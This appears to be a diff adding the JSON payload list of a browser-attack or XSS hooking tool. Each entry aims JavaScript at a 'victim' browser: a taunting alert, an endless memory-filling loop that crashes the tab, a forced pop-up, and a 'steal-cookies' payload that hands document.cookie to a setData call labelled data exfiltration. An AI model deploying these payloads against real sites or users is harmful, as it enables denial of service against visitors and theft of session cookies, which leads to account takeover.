@@ -1,0 +1,39 @@
+
+[
+    {
+      "name": "basic-alert",
+      "description": "Show a basic alert in the victims browser",
+      "payload": "alert('Pwned by Wagyu!');",
+      "compatibility": "All Browsers",
+      "type": "Misc",
+      "author": "Wagyu",
+      "risk": 5
+    },
+    {
+        "name": "crash-tab",
+        "description": "Crash the victims browser tab",
+        "payload": "let x = []; while(true){x.push('wagyu');}",
+        "compatibility": "All Browsers",
+        "type": "Misc",
+        "author": "Wagyu",
+        "risk": 5
+    },
+    {
+        "name": "rickroll",
+        "description": "Rickroll the victim",
+        "payload": "window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ');",
+        "compatibility": "All Browsers",
+        "type": "Misc",
+        "author": "Wagyu",
+        "risk": 5
+    },
+    {
+      "name": "steal-cookies",
+      "description": "Steal the victims cookies",
+      "payload": "setData('cookies', document.cookie);",
+      "compatibility": "All Browsers",
+      "type": "Data Exfiltration",
+      "author": "Wagyu",
+      "risk": 1
+    }
+  ]
